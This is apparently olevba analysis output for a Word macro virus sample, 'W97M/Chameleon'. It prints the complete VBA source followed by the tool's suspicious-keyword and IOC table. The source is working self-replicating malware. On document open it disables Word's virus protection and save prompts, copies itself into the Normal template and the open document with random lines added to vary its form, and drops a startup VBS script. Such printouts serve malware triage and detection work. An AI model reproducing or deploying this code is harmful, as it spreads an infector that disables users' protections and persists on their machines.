olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Chameleon-0acb2e5d49be575ce537fc7e5c3f2d5eab5eea07
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Chameleon-0acb2e5d49be575ce537fc7e5c3f2d5eab5eea07 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    On Error Resume Next
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "MVP") <> "Enabled by Total Konfuzion" Then
        Randomize
        Call VScript
        Dim x, rn
        Options.VirusProtection = (Rnd * 0)
        Options.SaveNormalPrompt = (Rnd * 0)
        Options.ConfirmConversions = (Rnd * 0)
        Options.SavePropertiesPrompt = (Rnd * 0)
        Application.EnableCancelKey = wdCancelDisabled: Application.DisplayAlerts = (Rnd * 0)
        Set n = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
        Set a = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
        Set td = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
        Open "C:\Windows\System\Chameleon.dll" For Output As #1
            Print #1, td.Lines(1, td.CountOfLines)
        Close #1
        If n.Lines(42, 1) <> "W97M/Chameleon" Then
            n.DeleteLines 1, n.CountOfLines
            n.AddFromFile ("C:\Windows\System\Chameleon.dll")
            n.ReplaceLine 42, "Sub ViewVBCode()"
            For x = 46 To 62 Step 2
                rn = (Rnd * 1000)
                n.ReplaceLine x, "'" & rn & Application.UserName
            Next x
        End If
        If a.Lines(42, 1) <> "W97M/Chameleon" Then
            a.DeleteLines 1, a.CountOfLines
            a.AddFromFile ("C:\Windows\System\Chameleon.dll")
            a.ReplaceLine 45, "Sub ToolsMacro()"
            For x = 46 To 62 Step 2
                rn = (Rnd * 1000)
                a.ReplaceLine x, "'" & rn & Application.ActivePrinter
            Next x
            ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
        End If
        Set n = Nothing
        Set a = Nothing
        Set td = Nothing
        If Day(Now) = 18 Then MsgBox "Let me slip into something" & vbCr & "a little more comfortable... :)", 4096, "W97M/Chameleon"
    End If
' W97M/Chameleon
'   by: Total Konfuzion
End Sub
Sub ToolsMacro()

End Sub

Private Function VScript()

    On Error Resume Next

    Open "C:\Windows\Start Menu\Programs\Startup\Chameleon.vbs" For Output As #1

        Print #1, "' W97M/Chameleon"

        Print #1, "'    by: Total Konfuzion"

        Print #1, "msgbox ""             Greetz from Chameleon   :)             "",4096,""W97M/Chameleon"""

    Close #1

End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Chameleon.dll       |Executable file name                         |
|IOC       |Chameleon.vbs       |Executable file name                         |
+----------+--------------------+---------------------------------------------+
